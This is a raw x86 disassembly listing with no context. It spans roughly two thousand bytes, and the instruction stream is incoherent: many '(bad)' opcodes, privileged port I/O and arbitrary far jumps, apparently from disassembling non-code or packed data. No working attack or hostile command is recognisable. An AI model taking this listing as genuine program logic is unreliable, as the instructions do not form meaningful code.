  41e9e7:	cmp    bl,al
  41e9e9:	sar    BYTE PTR [esi-0x73eaabb5],1
  41e9ef:	cmp    BYTE PTR [ebx-0x779db6c6],0xed
  41e9f6:	std    
  41e9f7:	xor    al,0xb5
  41e9f9:	inc    edx
  41e9fa:	leave  
  41e9fb:	fcomp  st(0)
  41e9fd:	jb     0x41e9be
  41e9ff:	cmc    
  41ea00:	test   DWORD PTR [ecx-0x4fa5977f],edi
  41ea06:	push   ds
  41ea07:	jge    0x41e9c4
  41ea09:	xchg   ebp,eax
  41ea0a:	xlat   BYTE PTR ds:[ebx]
  41ea0b:	mov    BYTE PTR [esi+0x7c],bl
  41ea0e:	adc    dh,BYTE PTR [esi]
  41ea10:	rcl    DWORD PTR [ebp+ecx*2-0x632b38bc],0xb7
  41ea18:	out    0x6d,al
  41ea1a:	aas    
  41ea1b:	jo     0x41e9d5
  41ea1d:	shr    DWORD PTR [esp+ebp*4+0x33],cl
  41ea21:	mov    ds:0x6cd57a6,eax
  41ea26:	fs push edi
  41ea28:	adc    ch,0xed
  41ea2b:	xchg   edx,eax
  41ea2c:	ret    
  41ea2d:	shl    BYTE PTR [ecx+0x48],0x27
  41ea31:	or     DWORD PTR [esi-0x1b09818],esp
  41ea37:	ret    
  41ea38:	jg     0x41ea13
  41ea3a:	or     ebp,DWORD PTR [ecx+0x456fbaf8]
  41ea40:	test   al,0xa0
  41ea42:	test   eax,0x5a3a1bf2
  41ea47:	cmp    edx,DWORD PTR ds:0xf36ccb24
  41ea4d:	mov    ?,WORD PTR [ecx-0x71a41d52]
  41ea53:	mov    ?,WORD PTR [ebx+eiz*4]
  41ea56:	gs imul eax,ebp,0xfffffff5
  41ea5a:	mov    eax,ds:0x66484042
  41ea5f:	or     BYTE PTR [edx-0x68],dh
  41ea62:	lods   eax,DWORD PTR ds:[esi]
  41ea63:	mov    ah,0x29
  41ea65:	cmp    al,bl
  41ea67:	mov    dl,0x1d
  41ea69:	add    bh,BYTE PTR [ecx+eax*1-0x28e6cdbb]
  41ea70:	xor    bl,BYTE PTR [ecx]
  41ea72:	outs   dx,BYTE PTR ds:[esi]
  41ea73:	add    esp,esp
  41ea75:	arpl   WORD PTR [eax-0x5ba0487c],si
  41ea7b:	sbb    eax,0x856a0d16
  41ea80:	fmul   DWORD PTR [eax+0x3917569d]
  41ea86:	and    al,0xbd
  41ea88:	ins    DWORD PTR es:[edi],dx
  41ea89:	pop    ecx
  41ea8a:	and    DWORD PTR [ebp-0x265857d8],edi
  41ea90:	xor    BYTE PTR [edi],0x7f
  41ea93:	lods   eax,DWORD PTR ds:[esi]
  41ea94:	lea    ebp,[esi]
  41ea96:	dec    eax
  41ea97:	outs   dx,DWORD PTR ds:[esi]
  41ea98:	cmp    BYTE PTR [esi+0x4267e9c9],0xdc
  41ea9f:	pop    ss
  41eaa0:	das    
  41eaa1:	pop    edi
  41eaa2:	push   0x7c
  41eaa4:	in     al,0xcd
  41eaa6:	sti    
  41eaa7:	mov    esi,fs
  41eaa9:	push   ebp
  41eaaa:	out    0xaf,al
  41eaac:	into   
  41eaad:	daa    
  41eaae:	jle    0x41eab3
  41eab0:	jne    0x41ea3f
  41eab2:	outs   dx,BYTE PTR ds:[esi]
  41eab3:	ror    BYTE PTR [esi*4-0x56fbe8f4],cl
  41eaba:	pop    ecx
  41eabb:	dec    edx
  41eabc:	sbb    eax,0x9c365243
  41eac1:	stos   BYTE PTR es:[edi],al
  41eac2:	stos   DWORD PTR es:[edi],eax
  41eac3:	cdq    
  41eac4:	fwait
  41eac5:	out    dx,eax
  41eac6:	dec    edx
  41eac7:	lds    esi,FWORD PTR [ebx-0x16]
  41eaca:	rol    DWORD PTR [ebx+0x5ce1b017],1
  41ead0:	mov    dl,0x58
  41ead2:	int    0xb1
  41ead4:	je     0x41eb17
  41ead6:	mov    dl,0x5f
  41ead8:	jb     0x41eb50
  41eada:	sbb    al,0xed
  41eadc:	ins    DWORD PTR es:[edi],dx
  41eadd:	(bad)  
  41eade:	mov    eax,ds:0xac3c9797
  41eae3:	xchg   esi,eax
  41eae4:	mov    ebp,0xec06c53f
  41eae9:	call   0x712e:0x4d0ceee8
  41eaf0:	push   esi
  41eaf1:	dec    eax
  41eaf2:	gs (bad) 
  41eaf4:	out    0x9d,eax
  41eaf6:	jmp    0x6b03:0x68d3bd20
  41eafd:	push   ecx
  41eafe:	popa   
  41eaff:	(bad)  
  41eb00:	cmp    eax,0xe58d5b67
  41eb05:	bswap  edi
  41eb07:	(bad)
  41eb0b:	int    0xad
  41eb0d:	dec    edi
  41eb0e:	xor    cl,bl
  41eb10:	test   BYTE PTR [eax-0x40],al
  41eb13:	push   edi
  41eb14:	and    al,0xce
  41eb16:	gs into 
  41eb18:	pop    es
  41eb19:	outs   dx,BYTE PTR ds:[esi]
  41eb1a:	dec    esi
  41eb1b:	gs inc ebp
  41eb1d:	and    DWORD PTR [edx+0x573068cf],eax
  41eb23:	mov    BYTE PTR [ebp-0x5cd6bd0e],0x16
  41eb2a:	dec    edx
  41eb2b:	sysexit 
  41eb2d:	pop    ss
  41eb2e:	data16 sti 
  41eb30:	in     eax,dx
  41eb31:	sub    esp,esi
  41eb33:	scas   eax,DWORD PTR es:[edi]
  41eb34:	cmp    edi,DWORD PTR [edi]
  41eb36:	test   DWORD PTR [esi],esi
  41eb38:	out    dx,eax
  41eb39:	mov    ah,0x4a
  41eb3b:	fnstcw WORD PTR [ecx+ecx*4+0x39]
  41eb3f:	mov    edx,0x7e572cd4
  41eb44:	sbb    DWORD PTR [edx],0x982edcd4
  41eb4a:	(bad)  
  41eb4b:	adc    BYTE PTR [esi-0x160f86fd],dh
  41eb51:	sbb    eax,0x4a9ff73f
  41eb56:	mov    BYTE PTR [ebp-0x6a],al
  41eb59:	cmp    al,0xde
  41eb5b:	push   esi
  41eb5c:	and    BYTE PTR [edi-0x69],dh
  41eb5f:	push   es
  41eb60:	lahf   
  41eb61:	fiadd  DWORD PTR [esi-0x37cf02b2]
  41eb67:	xchg   ebx,eax
  41eb68:	mov    ebx,0x11e24bae
  41eb6d:	mov    al,0xe6
  41eb6f:	je     0x41eb27
  41eb71:	sbb    eax,0x76e91770
  41eb76:	dec    edi
  41eb77:	jp     0x41eb2f
  41eb79:	ins    DWORD PTR es:[edi],dx
  41eb7a:	inc    ecx
  41eb7b:	in     eax,dx
  41eb7c:	jmp    0x809ff15f
  41eb81:	sti    
  41eb82:	mov    ebx,DWORD PTR [ebp-0x25029cb]
  41eb88:	enter  0x27a,0x81
  41eb8c:	dec    esp
  41eb8d:	push   0x8be81b7f
  41eb92:	fsubr  DWORD PTR [esp+eax*8+0x4f]
  41eb96:	(bad)  
  41eb97:	cmp    BYTE PTR [eax+0xb531798],dl
  41eb9d:	inc    ebp
  41eb9e:	in     al,0xba
  41eba0:	rcr    esi,0x74
  41eba3:	rcr    DWORD PTR [eax+0x6b56ef40],cl
  41eba9:	hlt    
  41ebaa:	add    esi,DWORD PTR [edi-0x65]
  41ebad:	add    BYTE PTR ds:0x799395bc,dl
  41ebb3:	sub    eax,0xf7f0aa63
  41ebb8:	jp     0x41eb9a
  41ebba:	inc    ecx
  41ebbb:	test   eax,0x8ce4c80
  41ebc0:	ds mov dl,0xf5
  41ebc3:	fwait
  41ebc4:	arpl   WORD PTR [eax],di
  41ebc6:	mov    bh,0xb2
  41ebc8:	outs   dx,DWORD PTR ds:[esi]
  41ebc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebca:	out    dx,al
  41ebcb:	add    ebx,DWORD PTR [eax-0x2e2243b4]
  41ebd1:	push   ecx
  41ebd2:	adc    cl,ah
  41ebd4:	retf   0x7aaf
  41ebd7:	sub    DWORD PTR [ebx+0x2c4ae747],0xf5047974
  41ebe1:	sub    esp,DWORD PTR [bx+si]
  41ebe4:	stos   BYTE PTR es:[edi],al
  41ebe5:	add    al,0xa
  41ebe7:	popf   
  41ebe8:	mov    ecx,0x4f96371
  41ebed:	jl     0x41ec1c
  41ebef:	(bad)  
  41ebf1:	jbe    0x41ec32
  41ebf3:	int3   
  41ebf4:	sbb    esp,esp
  41ebf6:	shl    BYTE PTR [eax],cl
  41ebf8:	(bad)  
  41ebf9:	pop    ebp
  41ebfa:	jmp    0x809dc2ff
  41ebff:	fwait
  41ec00:	ret    
  41ec01:	jp     0x41ebb7
  41ec03:	cmp    eax,0xff839bcb
  41ec08:	mov    ah,0xae
  41ec0a:	push   edi
  41ec0b:	es push ss
  41ec0d:	pop    ecx
  41ec0e:	xchg   dh,ch
  41ec10:	mov    esi,0x4672438e
  41ec15:	jmp    0x147fc572
  41ec1a:	and    DWORD PTR [ebx+eax*2-0x1b0b5916],0xffffffeb
  41ec22:	lahf   
  41ec23:	mov    al,ds:0xf48eadca
  41ec28:	cli    
  41ec29:	pop    ecx
  41ec2a:	retf   0x34cc
  41ec2d:	sbb    BYTE PTR [ecx],dl
  41ec2f:	push   cs
  41ec30:	les    ebx,FWORD PTR [esi]
  41ec32:	addr16 retf 0x30f1
  41ec36:	xor    dl,dh
  41ec38:	or     ebx,DWORD PTR [ebx+0x49536ac5]
  41ec3e:	inc    esi
  41ec3f:	sbb    al,0x9e
  41ec41:	dec    ecx
  41ec42:	mov    ?,eax
  41ec44:	arpl   WORD PTR [ebx],si
  41ec46:	inc    esp
  41ec47:	add    DWORD PTR ds:0xf1e33d3f,ebp
  41ec4d:	mov    bl,0x5d
  41ec4f:	fadd   QWORD PTR [edx]
  41ec51:	pop    ecx
  41ec52:	push   cs
  41ec53:	sbb    bl,BYTE PTR [ecx]
  41ec55:	enter  0xa399,0x3
  41ec59:	dec    ebp
  41ec5a:	cwde   
  41ec5b:	sti    
  41ec5c:	mov    edi,0x89b80089
  41ec61:	fmul   st(5),st
  41ec63:	test   eax,0x775eacbc
  41ec68:	shl    edi,1
  41ec6a:	imul   DWORD PTR [edx-0x35cf24a8]
  41ec70:	dec    ecx
  41ec71:	add    al,0xc9
  41ec73:	iret   
  41ec74:	out    0x74,al
  41ec76:	inc    esi
  41ec77:	and    esp,DWORD PTR [ebp+0x22]
  41ec7a:	es pop ebp
  41ec7c:	ins    BYTE PTR es:[edi],dx
  41ec7d:	and    esi,DWORD PTR [edi]
  41ec7f:	jbe    0x41ecbd
  41ec81:	sar    dl,1
  41ec83:	outs   dx,BYTE PTR ds:[esi]
  41ec84:	pop    ebx
  41ec85:	pop    esi
  41ec86:	add    DWORD PTR [eax-0x15],esi
  41ec89:	in     eax,0xe7
  41ec8b:	(bad)  
  41ec8c:	xlat   BYTE PTR ds:[ebx]
  41ec8d:	(bad)  
  41ec8f:	and    ch,BYTE PTR [esi+eiz*4-0x360594dc]
  41ec96:	adc    eax,0x122874a
  41ec9b:	xchg   ecx,eax
  41ec9c:	sbb    dl,BYTE PTR [eax]
  41ec9e:	fstp   DWORD PTR [ebp+eax*2-0x59]
  41eca2:	push   edx
  41eca3:	and    DWORD PTR [esi-0x1],esp
  41eca6:	pop    ebp
  41eca7:	lods   al,BYTE PTR ds:[esi]
  41eca8:	mov    ds:0x52ca8e20,al
  41ecad:	shl    ah,1
  41ecaf:	jb     0x41ec3e
  41ecb1:	sub    cl,BYTE PTR [eax+0x5a]
  41ecb4:	xchg   ebp,eax
  41ecb5:	out    0x5f,al
  41ecb7:	sub    al,0x86
  41ecb9:	mov    bl,0x33
  41ecbb:	xchg   bl,dh
  41ecbd:	dec    esi
  41ecbe:	xor    BYTE PTR [eax],cl
  41ecc0:	and    DWORD PTR [eax-0x2f],ebx
  41ecc3:	xchg   edi,eax
  41ecc4:	fwait
  41ecc5:	and    eax,0x8424874e
  41ecca:	sub    eax,0x238b2f9e
  41eccf:	or     dh,cl
  41ecd1:	cmp    dh,dl
  41ecd3:	push   es
  41ecd4:	push   edi
  41ecd5:	cdq    
  41ecd6:	ret    
  41ecd7:	es sub dl,bh
  41ecda:	xchg   esi,eax
  41ecdb:	hlt    
  41ecdc:	stos   BYTE PTR es:[edi],al
  41ecdd:	and    al,0xee
  41ecdf:	xlat   BYTE PTR ds:[ebx]
  41ece0:	ja     0x41ec7f
  41ece2:	cmp    eax,0x40ec77d2
  41ece7:	sub    esp,DWORD PTR [edi+0x2fecf44a]
  41eced:	dec    esi
  41ecee:	mov    ds:0xfdc2e11b,eax
  41ecf3:	push   ss
  41ecf4:	push   0x75
  41ecf6:	add    bl,dh
  41ecf8:	mov    ebx,0xdb17b8ef
  41ecfd:	and    al,0xa1
  41ecff:	push   esp
  41ed00:	jmp    DWORD PTR [edi+eiz*4]
  41ed03:	push   ebx
  41ed04:	jae    0x41ed7f
  41ed06:	mov    ecx,0x8bd2045f
  41ed0b:	icebp  
  41ed0c:	cwde   
  41ed0d:	jnp    0x41ece0
  41ed0f:	fwait
  41ed10:	xor    eax,0xe727d793
  41ed15:	out    dx,al
  41ed16:	pop    esi
  41ed17:	sub    BYTE PTR [edx-0x65773146],0xa2
  41ed1e:	xchg   BYTE PTR ds:0x88275bc6,ah
  41ed24:	xchg   edi,eax
  41ed25:	mov    ds:0xb5259922,al
  41ed2a:	xchg   ecx,eax
  41ed2b:	outs   dx,BYTE PTR ds:[esi]
  41ed2c:	cdq    
  41ed2d:	jp     0x41ecde
  41ed2f:	loop   0x41ed9b
  41ed31:	jo     0x41ed72
  41ed33:	mov    ds:0x7d5f0261,eax
  41ed38:	or     al,0x46
  41ed3a:	cmp    cl,BYTE PTR [edi+0x445e131d]
  41ed40:	call   0xa4329335
  41ed45:	aad    0x6
  41ed47:	mov    ecx,0xedce4e17
  41ed4c:	and    al,0xcb
  41ed4e:	sar    DWORD PTR [eax-0x3f],0xb6
  41ed52:	(bad)  
  41ed53:	ss dec edx
  41ed55:	loop   0x41ed00
  41ed57:	das    
  41ed58:	and    eax,0xf27ff9ec
  41ed5d:	sbb    BYTE PTR ds:0x67ea4386,0x23
  41ed64:	and    ah,al
  41ed66:	cmp    al,BYTE PTR [esi+0x3de9b7ff]
  41ed6c:	mov    edx,0x993ca6e2
  41ed71:	outs   dx,DWORD PTR ds:[esi]
  41ed72:	sbb    BYTE PTR [esi+0x12],0x83
  41ed76:	sbb    BYTE PTR [edi],ah
  41ed78:	fdiv   QWORD PTR [esi]
  41ed7a:	add    DWORD PTR [ecx+edx*8],edx
  41ed7d:	mov    ecx,0x7837c786
  41ed82:	mov    bh,0xa4
  41ed84:	ja     0x41ed65
  41ed86:	add    ebp,DWORD PTR [ecx+ecx*4+0x131875c4]
  41ed8d:	cli    
  41ed8e:	(bad)  
  41ed8f:	scas   eax,DWORD PTR es:[edi]
  41ed90:	pop    ss
  41ed91:	enter  0x21f8,0x20
  41ed95:	xor    DWORD PTR [edi-0x1c96f109],edi
  41ed9b:	cmp    al,0xf3
  41ed9d:	cmp    BYTE PTR ds:[ecx+0x520aee4a],bl
  41eda4:	and    BYTE PTR ds:0x33e3774a,bl
  41edaa:	jge    0x41ed75
  41edac:	sbb    eax,0xd43fd53a
  41edb1:	dec    esp
  41edb2:	and    edx,DWORD PTR [edi-0x58]
  41edb5:	stc    
  41edb6:	pop    esi
  41edb7:	fld    DWORD PTR [esp+ebx*8-0x549b7e2f]
  41edbe:	repz or edi,DWORD PTR ds:0x20ae1343
  41edc5:	and    ebx,esi
  41edc7:	(bad)  
  41edc8:	or     al,0x73
  41edca:	aas    
  41edcb:	sar    BYTE PTR [ebx-0x1db88b42],cl
  41edd1:	rcr    DWORD PTR ds:0x1cd4dfb4,cl
  41edd7:	sar    BYTE PTR [eax-0x701d9efe],0x95
  41edde:	and    cl,BYTE PTR [ebx-0x6868492]
  41ede4:	ins    DWORD PTR es:[edi],dx
  41ede5:	and    ebx,DWORD PTR [eax+0x5d020635]
  41edeb:	retf   0xe43a
  41edee:	loop   0x41ee6e
  41edf0:	popf   
  41edf1:	xchg   edi,eax
  41edf2:	imul   esi,DWORD PTR [edi-0x4f],0xff72cc15
  41edf9:	lods   al,BYTE PTR ds:[esi]
  41edfa:	(bad)  
  41edfb:	outs   dx,DWORD PTR ds:[esi]
  41edfc:	fstp   DWORD PTR [ecx-0x61]
  41edff:	push   ebx
  41ee00:	fiadd  DWORD PTR [ecx]
  41ee02:	rol    BYTE PTR [edi+0x75],1
  41ee05:	out    dx,al
  41ee06:	push   ebx
  41ee07:	das    
  41ee08:	bound  ecx,QWORD PTR [esi-0x161fc5f3]
  41ee0e:	cdq    
  41ee0f:	or     eax,0xa56932e2
  41ee14:	push   0x739a4b28
  41ee19:	cmp    eax,0x65534cf4
  41ee1e:	int    0x91
  41ee20:	xchg   DWORD PTR [edx+ebx*2],esi
  41ee23:	out    0x35,eax
  41ee25:	aam    0x48
  41ee27:	fmul   DWORD PTR [ebx-0xdac5582]
  41ee2d:	je     0x41ee5a
  41ee2f:	mov    BYTE PTR [edi],ch
  41ee31:	out    0x7a,eax
  41ee33:	(bad)  
  41ee34:	retf   0xe7c6
  41ee37:	jg     0x41ee61
  41ee39:	push   ds
  41ee3a:	pop    ds
  41ee3b:	mov    bl,0x3a
  41ee3d:	mov    bh,0xb9
  41ee3f:	mov    ds:0xf8c3ede7,eax
  41ee44:	xchg   esp,eax
  41ee45:	std    
  41ee46:	loope  0x41ee01
  41ee48:	mov    ch,0xb8
  41ee4a:	sbb    DWORD PTR [ebp-0x4c],esi
  41ee4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee4e:	mov    dh,0xcf
  41ee50:	aas    
  41ee51:	call   0x301a67f7
  41ee56:	popa   
  41ee57:	pop    edx
  41ee58:	test   al,0xc5
  41ee5a:	push   ecx
  41ee5b:	sbb    ah,al
  41ee5d:	pop    edx
  41ee5e:	enter  0xd47e,0x6a
  41ee62:	cmc    
  41ee63:	fcmove st,st(4)
  41ee65:	mov    dl,0xc2
  41ee67:	push   0xcfc25e1a
  41ee6c:	repnz stos BYTE PTR es:[edi],al
  41ee6e:	lea    edx,[ecx+0x44cbec1]
  41ee74:	retf   0xd47d
  41ee77:	fst    DWORD PTR [ecx+0x4fb8b548]
  41ee7d:	pop    eax
  41ee7e:	bound  ebp,QWORD PTR [esi]
  41ee80:	int    0x6d
  41ee82:	cli    
  41ee83:	pop    ecx
  41ee84:	out    dx,al
  41ee85:	sub    DWORD PTR [esp+edi*4],ebp
  41ee88:	arpl   WORD PTR [ebp-0x4],bp
  41ee8b:	inc    ebx
  41ee8c:	fiadd  DWORD PTR [ecx-0x538bfe2d]
  41ee92:	mov    al,ds:0xce33cb65
  41ee97:	jnp    0x41eed9
  41ee99:	shl    DWORD PTR cs:[eax-0x70],0xcd
  41ee9e:	retf   
  41ee9f:	fdiv   DWORD PTR [eax+0x35]
  41eea2:	mov    ch,0x30
  41eea4:	call   0xf5ad00a1
  41eea9:	mov    cl,0x12
  41eeab:	pop    ebx
  41eeac:	sub    eax,0xe599eae1
  41eeb1:	mov    ebp,0xb2666464
  41eeb6:	mov    ds:0xb9a7133b,al
  41eebb:	imul   esi,esi,0xf089391
  41eec1:	sbb    al,0xb9
  41eec3:	push   cs
  41eec4:	inc    esp
  41eec5:	rcr    BYTE PTR [edi-0x167791a3],0x70
  41eecc:	pop    ss
  41eecd:	aam    0xf9
  41eecf:	xbegin 0xc84b184
  41eed5:	mov    al,ds:0xda2b836e
  41eeda:	fmul   DWORD PTR [esi+eiz*1-0x6e]
  41eede:	and    eax,0x66a07639
  41eee3:	out    dx,al
  41eee4:	mov    ebp,0x6d0de6b8
  41eee9:	jl     0x41eed3
  41eeeb:	mov    esi,0x36d64050
  41eef0:	push   ebx
  41eef1:	cmp    BYTE PTR [ebx-0x2ac9541d],0x8d
  41eef8:	mov    ds:0xa3187b6f,al
  41eefd:	or     BYTE PTR [ebp-0x76276283],bh
  41ef03:	not    DWORD PTR [ebp-0x5c]
  41ef06:	jge    0x41ee95
  41ef08:	adc    al,0xb8
  41ef0a:	sbb    BYTE PTR [ebp-0x2c],al
  41ef0d:	frndint 
  41ef0f:	and    eax,0xf5ca2a52
  41ef14:	dec    esp
  41ef15:	xor    al,0x1e
  41ef17:	sub    ah,bl
  41ef19:	mov    edx,0xc001c838
  41ef1e:	repz aam 0x8
  41ef21:	sbb    BYTE PTR [ebx+0x47b69297],ch
  41ef27:	ins    DWORD PTR es:[edi],dx
  41ef28:	sbb    DWORD PTR [eax-0x2f],edx
  41ef2b:	addr16 push ds
  41ef2d:	not    BYTE PTR [ecx+0x528d8f1a]
  41ef33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef34:	call   0x6464:0x6012991c
  41ef3b:	int    0x74
  41ef3d:	mov    esi,0xbe80f4c5
  41ef42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef43:	int    0xbc
  41ef45:	imul   ah
  41ef47:	fsubr  DWORD PTR [ebx-0x6d]
  41ef4a:	fadd   QWORD PTR [ebx]
  41ef4c:	(bad)  
  41ef4d:	mov    eax,ds:0xaa2cd7f2
  41ef52:	cs stos DWORD PTR es:[edi],eax
  41ef54:	add    BYTE PTR [ebx+0x1],0x62
  41ef58:	mov    ?,WORD PTR [ebx]
  41ef5a:	jge    0x41eef7
  41ef5c:	das    
  41ef5d:	mov    ebx,0x912b8d38
  41ef62:	jns    0x41ef5f
  41ef64:	sub    eax,0xce9616e2
  41ef69:	cmp    al,0x28
  41ef6b:	pop    edi
  41ef6c:	jl     0x41eef3
  41ef6e:	mov    edi,0x23a4d37c
  41ef73:	xchg   edx,eax
  41ef74:	jne    0x41eefc
  41ef76:	fstp   DWORD PTR [edx+0x48bed7c9]
  41ef7c:	sub    DWORD PTR [esi+0x1c],ebp
  41ef7f:	push   cs
  41ef80:	mov    ecx,0xa6eef002
  41ef85:	test   al,0x2c
  41ef87:	mov    edi,0xdfd97d63
  41ef8c:	and    esi,DWORD PTR [ecx]
  41ef8e:	enter  0x138a,0xf9
  41ef92:	sti    
  41ef93:	push   0x828fd0b5
  41ef98:	fdivp  st(5),st
  41ef9a:	bound  edi,QWORD PTR ds:0xb99b07a6
  41efa0:	push   ss
  41efa1:	mov    ds:0x33da1870,eax
  41efa6:	or     DWORD PTR [ebp-0x86889f2],eax
  41efac:	push   es
  41efad:	push   0xffffffc8
  41efaf:	in     eax,0xe2
  41efb1:	mov    ds:0xd6556e91,al
  41efb6:	dec    eax
  41efb7:	or     DWORD PTR [esi],esp
  41efb9:	xlat   BYTE PTR ds:[ebx]
  41efba:	aaa    
  41efbb:	test   BYTE PTR ds:0x969221c6,bh
  41efc1:	push   ecx
  41efc2:	shr    DWORD PTR ds:0x7f8a0703,1
  41efc8:	sbb    cl,BYTE PTR [esi+0x55f4885]
  41efce:	inc    edi
  41efcf:	jns    0x41f050
  41efd1:	les    ecx,FWORD PTR [edi-0x28bb23c]
  41efd7:	add    cl,BYTE PTR [eax-0x6cce7764]
  41efdd:	or     BYTE PTR fs:[edx-0x1b9b66d1],ah
  41efe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efe5:	pop    ds
  41efe6:	stos   DWORD PTR es:[edi],eax
  41efe7:	dec    ebp
  41efe8:	inc    eax
  41efe9:	inc    di
  41efeb:	add    esp,esp
  41efed:	sub    cl,BYTE PTR [edx-0x26]
  41eff0:	or     ebx,DWORD PTR [eax]
  41eff2:	mov    eax,ds:0x1a692b55
  41eff7:	inc    esp
  41eff8:	cmc    
  41eff9:	xchg   DWORD PTR [eax],ebp
  41effb:	adc    ecx,DWORD PTR [eax+esi*4-0x73b288ed]
  41f002:	jbe    0x41f02b
  41f004:	push   edi
  41f005:	dec    ecx
  41f006:	test   eax,0x30b1cdf5
  41f00b:	jns    0x41f06f
  41f00d:	and    DWORD PTR [edi],esi
  41f00f:	lds    edi,FWORD PTR ds:0x651b179b
  41f015:	popf   
  41f016:	dec    dx
  41f018:	xchg   ebp,eax
  41f019:	int3   
  41f01a:	mov    eax,ds:0xab8bb450
  41f01f:	add    DWORD PTR ds:0xc708b64c,ecx
  41f025:	or     DWORD PTR [esi+0x53],0xbbf6a709
  41f02c:	sbb    dh,BYTE PTR [esi-0x58]
  41f02f:	out    0x5a,al
  41f031:	test   DWORD PTR [edx-0xdee6185],0xfbac7dc0
  41f03b:	cmp    dh,BYTE PTR [esi+0x51]
  41f03e:	mov    esp,0x49b13073
  41f043:	repnz mov bh,0x26
  41f046:	(bad)  
  41f047:	shl    DWORD PTR [edx-0x3a],1
  41f04a:	fild   WORD PTR [ebp+0x1e]
  41f04d:	and    eax,0x9d36075c
  41f052:	lods   al,BYTE PTR ds:[esi]
  41f053:	jl     0x41f09c
  41f055:	lahf   
  41f056:	outs   dx,WORD PTR ds:[esi]
  41f058:	pop    ebx
  41f059:	cwde   
  41f05a:	pop    edi
  41f05b:	repz xchg ebx,eax
  41f05d:	and    DWORD PTR ds:0x310,ebx
  41f062:	cmp    al,0xa7
  41f064:	mov    eax,0x67e93346
  41f069:	cli    
  41f06a:	test   DWORD PTR [ebx],ebp
  41f06c:	fsubr  st(5),st
  41f06e:	pop    DWORD PTR [esi+0xb]
  41f071:	fmul   st(4),st
  41f073:	and    al,0xc4
  41f075:	jmp    0xba8ef59a
  41f07a:	add    BYTE PTR ds:0xd4ca93cc,dl
  41f080:	daa    
  41f081:	inc    ebp
  41f082:	dec    esp
  41f083:	pop    esp
  41f084:	xchg   DWORD PTR [esi],edi
  41f086:	cs inc esp
  41f088:	into   
  41f089:	sub    BYTE PTR [eax+0x2180daaf],0xea
  41f090:	push   ss
  41f091:	les    edi,FWORD PTR [esi+eiz*8]
  41f094:	(bad)  
  41f095:	in     al,0xdb
  41f097:	xchg   edx,eax
  41f098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f099:	cmc    
  41f09a:	mov    ds:0xe5c47f96,al
  41f09f:	sub    al,0x51
  41f0a1:	sbb    bh,BYTE PTR [edx+0x7b456016]
  41f0a7:	dec    eax
  41f0a8:	loop   0x41f0d7
  41f0aa:	lea    ebp,[edi+edi*4-0x5db8393d]
  41f0b1:	aad    0xee
  41f0b3:	das    
  41f0b4:	sti    
  41f0b5:	mov    ds:0x2bae0a1a,eax
  41f0ba:	push   0xffffffc9
  41f0bc:	jbe    0x41f0dd
  41f0be:	shr    BYTE PTR [edi+0x26],1
  41f0c1:	mov    ecx,0xde184d31
  41f0c6:	xchg   BYTE PTR [ecx+esi*1+0x1c],ah
  41f0ca:	data16 mov dl,0x15
  41f0cd:	fsubr  st(1),st
  41f0cf:	adc    esp,edx
  41f0d1:	mov    ds:0x3e6b0b4e,al
  41f0d6:	and    eax,ecx
  41f0d8:	or     DWORD PTR ds:0x385c33fe,0xd
  41f0df:	popf   
  41f0e0:	jmp    0x6437:0xf3860969
  41f0e7:	sub    eax,0x401efb85
  41f0ec:	sub    al,0x41
  41f0ee:	add    dl,BYTE PTR [edi-0x6]
  41f0f1:	outs   dx,BYTE PTR ds:[esi]
  41f0f2:	cs dec ebx
  41f0f4:	lds    eax,FWORD PTR [esp+ecx*4]
  41f0f7:	mov    cl,0x79
  41f0f9:	(bad)  
  41f0fa:	adc    eax,0x8a278436
  41f0ff:	push   esp
  41f100:	inc    ecx
  41f101:	fst    QWORD PTR [ebx-0xfba4577]
  41f107:	ja     0x41f184
  41f109:	imul   edx,DWORD PTR [ecx],0x189ccddf
  41f10f:	push   eax
  41f110:	add    DWORD PTR [ebp+0x60442f98],esp
  41f116:	push   ecx
  41f117:	fwait
  41f118:	or     BYTE PTR [ebx],dl
  41f11a:	pop    edx
  41f11b:	jmp    0x7c82afbf
  41f120:	test   BYTE PTR [esi+edx*4+0x5fef4a69],dh
  41f127:	cmp    ebx,DWORD PTR ds:0x30972a1
  41f12d:	les    ebx,FWORD PTR [ecx+0x5abde8b7]
  41f133:	add    al,0x81
  41f135:	int3   
  41f136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f137:	lock push es
  41f139:	xor    bl,BYTE PTR [ebp+ebx*8-0x25d2c309]
  41f140:	aam    0x7c
  41f142:	rcr    DWORD PTR [eax+0x5eaf985d],0xf4
  41f149:	vaddpd ymm4,ymm2,YMMWORD PTR [ebx+0x706bfad9]
  41f151:	inc    esi
  41f152:	mov    edx,esi
  41f154:	inc    eax
  41f155:	or     eax,0xa93ba861
  41f15a:	clc    
  41f15b:	xor    dl,bl
  41f15d:	sbb    BYTE PTR [ecx],dl
  41f15f:	lods   eax,DWORD PTR ds:[esi]
  41f160:	mov    ds:0x1c24c3dd,eax
  41f165:	jne    0x41f193
  41f167:	pop    es
  41f168:	dec    ecx
  41f169:	jae    0x41f181
  41f16b:	sbb    bh,BYTE PTR [ebx]
  41f16d:	add    dh,BYTE PTR [eax-0x45]
  41f170:	leave  
  41f171:	sub    bl,0xd
  41f174:	scas   al,BYTE PTR es:[edi]
  41f175:	xchg   edi,eax
  41f176:	mov    cl,0xcc
  41f178:	rol    DWORD PTR [ebp+ebp*2+0x3b686c4],1
  41f17f:	and    BYTE PTR [eax-0x63627c0],cl
  41f185:	mov    al,ds:0x4dd1f9b3
  41f18a:	test   DWORD PTR [ebx-0x12831e22],esp
  41f190:	jae    0x41f1cb
  41f192:	ins    BYTE PTR es:[edi],dx
  41f193:	xor    al,dh
  41f195:	sub    DWORD PTR ds:0x9b4d79a9,eax
  41f19b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f19c:	dec    edi
  41f19d:	push   ecx
  41f19e:	sbb    DWORD PTR [edi],esp
  41f1a0:	fld    QWORD PTR [ebp-0x2b]
  41f1a3:	std    
  41f1a4:	rcr    BYTE PTR [ebx+0x32143a6a],1
  41f1aa:	cmp    eax,0x1d71d55c
  41f1af:	lods   al,BYTE PTR ds:[esi]
  41f1b0:	stos   DWORD PTR es:[edi],eax
